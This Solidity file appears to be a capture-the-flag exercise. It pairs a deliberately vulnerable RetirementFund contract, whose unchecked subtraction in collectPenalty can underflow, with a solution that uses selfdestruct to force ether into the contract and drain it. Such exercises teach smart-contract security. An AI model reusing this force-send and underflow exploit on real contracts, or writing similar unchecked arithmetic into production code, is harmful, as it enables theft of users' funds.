// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/console.sol";

contract RetirementFund {
    uint256 startBalance;
    address owner = msg.sender;
    address beneficiary;
    uint256 expiration = block.timestamp + 520 weeks;

    constructor(address player) payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function withdraw() public {
        require(msg.sender == owner);

        if (block.timestamp < expiration) {
            // early withdrawal incurs a 10% penalty
            (bool ok,) = msg.sender.call{value: (address(this).balance * 9) / 10}("");
            require(ok, "Transfer to msg.sender failed");
        } else {
            (bool ok,) = msg.sender.call{value: address(this).balance}("");
            require(ok, "Transfer to msg.sender failed");
        }
    }

    function collectPenalty() public {
        require(msg.sender == beneficiary);
        uint256 withdrawn = 0;
        unchecked {
            withdrawn += startBalance - address(this).balance;
            //console.log(withdrawn);
            // an early withdrawal occurred
            require(withdrawn > 0);
        }

        // penalty is what's left
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "Transfer to msg.sender failed");
    }
}

// Write your exploit contract below
contract ExploitContract {
    RetirementFund public retirementFund;

    constructor(RetirementFund _retirementFund) {
        retirementFund = _retirementFund;
    }

    function attack() public {
        //payable(address(retirementFund)).call{value: 1}("");
        ForceEtherSender f = new ForceEtherSender{value: 1}();
        f.forceSend(payable(address(retirementFund)));
    }

    // write your exploit functions below
}

contract ForceEtherSender {
    // Constructor to optionally receive Ether upon deployment
    constructor() payable {}

    // Function to allow the contract to receive Ether
    receive() external payable {}

    // Function to self-destruct and force-send Ether to an address
    function forceSend(address payable recipient) external {
        // Requires that the contract has a balance greater than 0
        require(address(this).balance > 0, "No Ether to send");

        // selfdestruct sends all Ether held by the contract to the recipient
        selfdestruct(recipient);
    }
}
